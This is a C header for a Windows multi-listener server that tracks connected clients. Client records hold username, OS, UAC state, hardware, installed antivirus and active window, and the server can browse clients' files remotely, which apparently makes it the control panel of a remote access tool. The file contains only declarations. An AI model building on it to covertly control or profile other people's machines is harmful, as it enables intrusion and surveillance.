#ifndef SERVER_LOGIC_H
#define SERVER_LOGIC_H

#include <ws2tcpip.h>

#define MAX_SERVERS 20
#define MAX_CLIENTS 100

typedef enum
{
    SERVER_STOPPED,
    SERVER_STARTING,
    SERVER_LISTENING,
    SERVER_ERROR
} ServerStatus;

typedef struct
{
    WCHAR ipAddress[16];
    int port;
    ServerStatus status;
    SOCKET listenSocket;
    HANDLE hThread;
} ServerInfo;

typedef struct
{
    SOCKET socket;
    char ipAddress[16];
    int serverPort;
    char country[128];
    char clientID[64];
    char username[256];
    char os[256];
    char group[32];
    char date[64];
    BOOL UAC;
    char cpu[128];
    char gpu[128];
    char ram[128];
    char antivirus[128];
    char active_window[256];
} ClientInfo;

typedef struct
{
    SOCKET socket;
    ClientInfo info;
    HANDLE hThread;
    CRITICAL_SECTION cs_socket_access;
    HWND hExplorerWnd;
    BOOL isActive;
} ActiveClient;

typedef struct
{
    SOCKET clientSocket;
    char clientIp[16];
} ClientThreadArgs;

typedef struct
{
    WCHAR fileName[MAX_PATH];
    WCHAR filePath[MAX_PATH];
    WCHAR fileSize[32];
    WCHAR fileType[64];
    WCHAR dataModified[128];
} FileInfo;

typedef struct
{
    WCHAR folderName[MAX_PATH];
    WCHAR folderPath[MAX_PATH];
    WCHAR dataModified[128];
} FolderInfo;

typedef struct
{
    SOCKET client_socket;

} CLIENTS_SOCKETS;
extern ServerInfo g_servers[MAX_SERVERS];
extern int g_server_count;

DWORD WINAPI StartListenerThread(LPVOID lpParameter);
DWORD WINAPI ClientHandlerThread(LPVOID lpParameter);

#endif